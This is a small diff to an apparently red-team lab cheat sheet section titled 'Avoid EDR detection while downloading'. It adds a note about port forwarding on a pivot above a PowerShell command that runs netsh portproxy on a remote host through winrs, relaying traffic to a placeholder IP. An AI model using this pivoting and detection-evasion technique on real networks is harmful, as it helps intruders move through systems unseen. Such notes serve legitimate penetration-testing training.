@@ -16,6 +16,8 @@ Copy-Item <PATH> \\<MACCHINA>\<R PATH>
 
 ### **Avoid EDR detection while downloading**
 
+Do a portforwarding on a pivot
+
 {% code overflow="wrap" %}
 ```powershell
 $null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<IP>"
